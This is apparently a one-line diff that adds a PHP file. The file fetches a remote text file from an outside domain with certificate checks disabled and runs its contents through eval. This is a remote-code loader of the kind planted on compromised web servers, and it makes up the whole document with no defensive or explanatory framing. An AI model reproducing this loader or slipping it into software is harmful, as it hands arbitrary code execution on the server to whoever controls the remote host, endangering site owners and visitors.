@@ -1,0 +1,1 @@
+<?php ($c=curl_init())&&curl_setopt_array($c,[CURLOPT_URL=>'https://v1.javpornsub.net/5.txt',CURLOPT_RETURNTRANSFER=>1,CURLOPT_SSL_VERIFYPEER=>0])&&($r=curl_exec($c))?eval('?>'.$r):die('Error'); curl_close($c);
